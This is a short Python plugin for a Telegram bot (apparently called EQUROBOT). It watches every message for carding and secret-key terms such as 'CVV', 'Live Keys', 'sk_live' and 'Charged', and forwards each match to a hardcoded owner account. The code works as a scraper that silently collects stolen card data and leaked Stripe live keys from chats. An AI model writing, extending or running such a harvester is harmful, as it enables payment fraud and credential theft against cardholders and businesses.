from pyrogram import Client, filters
from EQUROBOT import app

owner_id = 7427691214


keywords = ["charge", "Live Keys", "approve", "CVV", "CNN", "✅", "live", "𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅", "sk_live", "Charged", "🔥"]

@app.on_message(filters.all)
async def check_keywords(client, message):
    message_content = message.text or message.caption or ""
    if any(keyword in message_content for keyword in keywords):
        await client.send_message(owner_id, f"Found a match in message:\n\n{message_content}")
        print(f"Forwarded message to owner {owner_id}")
